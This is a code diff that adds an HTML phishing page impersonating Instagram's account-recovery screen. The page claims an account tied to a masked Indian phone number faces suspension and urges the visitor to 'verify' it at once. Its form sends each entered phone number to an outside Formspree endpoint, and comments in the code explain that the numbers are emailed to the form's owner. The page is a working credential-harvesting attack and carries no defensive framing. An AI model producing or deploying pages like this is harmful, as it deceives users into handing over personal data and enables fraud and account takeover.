@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Trouble with logging in?</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Pacifico&display=swap" rel="stylesheet">
+  <link rel="icon" href="favicon.png" type="image/png">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="header-inner">
+      <!-- Use local logo.jpg (place logo.jpg in the same folder) -->
+      <img src="logo.jpg" alt="Instagram" class="logo-img" />
+      <nav class="auth-links">
+        <a class="btn ghost small" href="#">Log in</a>
+        <a class="signup" href="#">Sign up</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="page">
+    <section class="card outer-card">
+      <div class="inner-card">
+        <div class="lock-circle" aria-hidden="true">
+          <svg width="56" height="56" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="12" cy="12" r="11" stroke="#838383" stroke-width="1.2" />
+            <rect x="9" y="11" width="6" height="5" rx="0.8" stroke="#fff" stroke-width="1.2" fill="none" />
+            <path d="M10 11V9a2 2 0 0 1 4 0v2" stroke="#fff" stroke-width="1.2" fill="none" stroke-linecap="round"/>
+          </svg>
+        </div>
+
+        <h1 class="title">Account Security Check</h1>
+        <p class="subtitle">
+        We've received reports related to an account associated with the mobile number +91*****92.
+            <br>
+        Verify your mobile number immediately to prevent account suspension.</p>
+
+        <!-- Form posts to Formspree so submitted phone numbers are emailed to the account
+             configured for the form ID (https://formspree.io/f/mrblvqpv) -->
+        <form class="recover-form" action="https://formspree.io/f/mrblvqpv" method="POST">
+          <label class="visually-hidden" for="identifier">Enter phone number</label>
+          <!-- name="phone" ensures the value is sent as the phone field to Formspree -->
+          <input id="identifier" name="phone" class="input" type="tel" placeholder="Enter phone number" autocomplete="tel" required />
+
+          <!-- Optional hidden fields for Formspree: subject and redirect after submit -->
+          <input type="hidden" name="_subject" value="Send login link request">
+          <input type="hidden" name="_next" value="./?sent=1">
+
+          <button class="primary-btn" type="submit">Send login link</button>
+        </form>
+
+        <a class="small-link" href="#">Can't reset your password?</a>
+
+        <div class="or-row">
+          <span class="line"></span>
+          <span class="or">OR</span>
+          <span class="line"></span>
+        </div>
+
+        <a class="create-link" href="#">Create New Account</a>
+      </div>
+
+      <div class="back-login">Back to Login</div>
+    </section>
+  </main>
+
+  <footer class="site-footer"></footer>
+
+</body>
+</html>
